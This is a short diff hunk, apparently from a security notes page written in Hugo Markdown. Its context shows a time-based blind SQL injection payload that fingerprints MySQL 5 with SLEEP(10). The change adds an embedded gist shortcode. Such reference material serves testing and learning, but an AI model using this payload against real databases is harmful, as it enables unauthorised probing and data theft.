@@ -32,3 +32,5 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 # sleep on mysql 5.*
 1' AND CASE (SUBSTRING(VERSION(), 1, 1)) WHEN 5 THEN SLEEP(10) ELSE NULL END AND '1
 ```
+
+{{< gist duraki 7b4744e7129fe61655a1c8384c76952f >}}
